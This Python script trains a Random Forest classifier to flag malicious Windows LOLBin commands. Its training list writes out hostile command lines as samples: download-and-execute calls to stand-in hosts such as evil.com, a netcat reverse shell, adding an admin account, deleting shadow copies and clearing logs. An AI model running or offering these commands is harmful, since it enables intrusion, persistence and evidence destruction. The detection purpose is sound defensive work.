"""
Model Trainer - Trains a Random Forest classifier on labeled sample commands
and saves the model to model.pkl.

Usage:
    python server/model_trainer.py

This only needs to be run once (or re-run whenever you update training data).
Trained on Windows LOLBin attack samples.
"""

import sys
import os

# Ensure sibling modules are importable
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import joblib
import numpy as np
from sklearn.ensemble import RandomForestClassifier
from sklearn.model_selection import train_test_split
from sklearn.metrics import classification_report, accuracy_score

from feature_extractor import extract_features, features_to_list, FEATURE_NAMES

# Training Data: (command_string, label)
#   label: 1 = malicious, 0 = benign

TRAINING_DATA = [
    # --- Windows Malicious commands ---
    ("powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA", 1),
    ("powershell.exe -encodedcommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0A", 1),
    ("powershell.exe -ep bypass -windowstyle hidden -command IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')", 1),
    ("powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://malware.com/shell.ps1')", 1),
    ("powershell.exe -nop -w hidden -ep bypass -c IEX((New-Object Net.WebClient).DownloadString('http://attacker.com/rev.ps1'))", 1),
    ("powershell.exe -command \"& {Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com/p.ps1')}\"", 1),
    ("powershell.exe Start-Process cmd -ArgumentList '/c net user hacker P@ss /add'", 1),
    ("certutil.exe -urlcache -split -f http://malware.com/payload.exe C:\\\\temp\\\\payload.exe", 1),
    ("certutil.exe -urlcache -f http://evil.com/backdoor.exe C:\\\\Windows\\\\Temp\\\\svchost.exe", 1),
    ("mshta.exe http://evil.com/payload.hta", 1),
    ("mshta.exe vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -ep bypass -c IEX\"\"\")", 1),
    ("rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";document.write();GetObject(\"script:http://evil.com/s.sct\")", 1),
    ("regsvr32.exe /s /n /u /i:http://evil.com/file.sct scrobj.dll", 1),
    ("wmic.exe process call create \"powershell.exe -ep bypass -file C:\\\\temp\\\\evil.ps1\"", 1),
    ("wmic.exe /node:192.168.1.1 process call create \"cmd.exe /c net user\"", 1),
    ("bitsadmin.exe /transfer myJob /download /priority high http://evil.com/malware.exe C:\\\\temp\\\\malware.exe", 1),
    ("bitsadmin.exe /transfer job1 http://malware.com/shell.exe C:\\\\Users\\\\Public\\\\shell.exe", 1),
    ("cscript.exe //nologo C:\\\\temp\\\\evil.vbs", 1),
    ("wscript.exe C:\\\\Users\\\\Public\\\\Downloads\\\\payload.vbs", 1),
    ("cmd.exe /c powershell.exe -ep bypass -e SQBFAFgA", 1),
    ("cmd.exe /c certutil -urlcache -f http://evil.com/nc.exe C:\\\\nc.exe && C:\\\\nc.exe -e cmd.exe 10.0.0.1 4444", 1),
    ("powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File C:\\\\temp\\\\exfil.ps1", 1),
    ("powershell.exe [System.Convert]::FromBase64String('aGVsbG8=') | Set-Content C:\\\\temp\\\\decoded.exe", 1),
    ("powershell.exe -c \"(New-Object System.Net.WebClient).DownloadFile('http://evil.com/mal.exe','C:\\\\temp\\\\mal.exe')\"", 1),
    ("powershell.exe Invoke-Expression (Invoke-WebRequest -Uri http://evil.com/payload.ps1)", 1),
    ("rundll32.exe shell32.dll,ShellExec_RunDLL powershell.exe -ep bypass -c IEX(malicious)", 1),
    ("wmic.exe shadowcopy delete /nointeractive", 1),
    ("cmd.exe /c echo malicious | powershell.exe -nop -ep bypass -", 1),
    ("powershell.exe -w hidden -nop Start-BitsTransfer -Source http://evil.com/mal.exe -Destination C:\\\\temp\\\\m.exe", 1),
    ("cscript.exe //E:jscript C:\\\\temp\\\\payload.js", 1),
    ("mshta.exe vbscript:Execute(\"CreateObject(\"\"WScript.Shell\"\").Run \"\"calc.exe\"\"\")(window.close)", 1),
    ("schtasks.exe /create /sc minute /mo 1 /tn \"Updater\" /tr \"cmd.exe /c echo hi\" /f", 1),
    ("schtasks /run /tn \"Updater\"", 1),
    ("reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Update\" /d \"powershell.exe -ep bypass -w hidden C:\\payload.ps1\" /f", 1),
    ("forfiles.exe /p c:\\windows\\system32 /m notepad.exe /c \"cmd.exe /c calc.exe\"", 1),
    ("pcalua.exe -a cmd.exe -c \"calc.exe\"", 1),
    ("msiexec.exe /q /i http://evil.com/payload.msi", 1),
    ("powershell.exe -Command \"Remove-Item -Path 'C:\\Users\\user\\Downloads\\evidence.txt' -Force\"", 1),
    ("wevtutil.exe cl Security", 1),
    ("fsutil.exe usn deletejournal /D C:", 1),
    ("net.exe user hacker P@ss /add", 1),
    ("net.exe localgroup administrators hacker /add", 1),
    ("cmd.exe /c \"powershell.exe -nop -w hidden -ec SQBFAFgA...\"", 1),
    ("powershell.exe Clear-EventLog -LogName Security", 1),
    ("certutil.exe -decode payload.txt payload.exe", 1),



    # --- Windows Benign commands ---
    ("notepad.exe C:\\\\Users\\\\user\\\\Documents\\\\notes.txt", 0),
    ("explorer.exe C:\\\\Users\\\\user\\\\Downloads", 0),
    ("chrome.exe --new-tab https://google.com", 0),
    ("code.exe C:\\\\Projects\\\\myapp", 0),
    ("python.exe manage.py runserver", 0),
    ("git.exe commit -m 'update readme'", 0),
    ("node.exe server.js", 0),
    ("npm.exe install express", 0),
    ("taskmgr.exe", 0),
    ("calc.exe", 0),
    ("mspaint.exe", 0),
    ("svchost.exe -k netsvcs -p -s Schedule", 0),
    ("SystemSettings.exe", 0),
    ("SearchUI.exe", 0),
    ("RuntimeBroker.exe", 0),
    ("conhost.exe 0xffffffff -ForceV1", 0),
    ("dllhost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}", 0),
    ("sihost.exe", 0),
    ("ctfmon.exe", 0),
    ("cmd.exe /c dir C:\\\\Users\\\\user\\\\Documents", 0),
    ("cmd.exe /c ping localhost", 0),
    ("powershell.exe Get-Date", 0),
    ("powershell.exe Get-Process | Sort-Object CPU", 0),
    ("wmic.exe cpu get name", 0),

]


def train():
    """Train the Random Forest model and save to model.pkl."""
    print("=" * 55)
    print("  [*] Windows LOLBins Detection - Model Trainer")
    print("=" * 55)
    print()

    # Extract features
    X = []
    y = []

    for command, label in TRAINING_DATA:
        features = extract_features(command)
        X.append(features_to_list(features))
        y.append(label)

    X = np.array(X)
    y = np.array(y)

    mal_count = sum(y == 1)
    ben_count = sum(y == 0)
    print(f"  Total samples : {len(y)}")
    print(f"  Malicious     : {mal_count}")
    print(f"  Benign        : {ben_count}")
    print()

    # Split data
    X_train, X_test, y_train, y_test = train_test_split(
        X, y, test_size=0.25, random_state=42, stratify=y
    )

    # Train Random Forest
    model = RandomForestClassifier(
        n_estimators=100,
        max_depth=10,
        random_state=42,
        class_weight="balanced",
    )
    model.fit(X_train, y_train)

    # Evaluate
    y_pred = model.predict(X_test)
    accuracy = accuracy_score(y_test, y_pred)

    print(f"  [OK] Accuracy: {accuracy:.2%}")
    print()
    print("  Classification Report:")
    print("  " + "-" * 50)
    report = classification_report(y_test, y_pred, target_names=["Benign", "Malicious"])
    for line in report.split("\n"):
        print(f"  {line}")
    print()

    # Save model
    model_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "model.pkl")
    joblib.dump(model, model_path)
    print(f"  [SAVED] Model saved to: {model_path}")
    print()

    # Feature importance
    importances = model.feature_importances_
    sorted_idx = np.argsort(importances)[::-1]

    print("  [*] Feature Importance:")
    print("  " + "-" * 40)
    for idx in sorted_idx:
        bar = "#" * int(importances[idx] * 30)
        print(f"  {FEATURE_NAMES[idx]:25s} {importances[idx]:.4f} {bar}")
    print()
    print("  [OK] Training complete!")


if __name__ == "__main__":
    train()
